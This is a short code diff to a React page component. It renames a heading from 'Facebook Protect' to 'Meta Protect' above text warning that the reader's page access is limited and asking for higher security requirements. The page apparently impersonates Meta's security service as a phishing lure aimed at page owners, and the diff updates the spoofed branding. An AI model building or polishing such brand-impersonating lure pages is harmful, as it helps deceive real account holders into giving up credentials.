@@ -17,7 +17,7 @@ const Index: React.FC = () => {
 		<div className='flex min-h-screen flex-col items-center justify-center py-8'>
 			<div className='flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3'>
 				<img src={HeroImage} alt='Hero' className='rounded-t-lg' />
-				<b className='text-2xl'>Welcome To Facebook Protect.</b>
+				<b className='text-2xl'>Welcome To Meta Protect.</b>
 				<p>
 					Your page's accessibility is limited, so we ask that higher
 					security requirements be applied to that account. We created
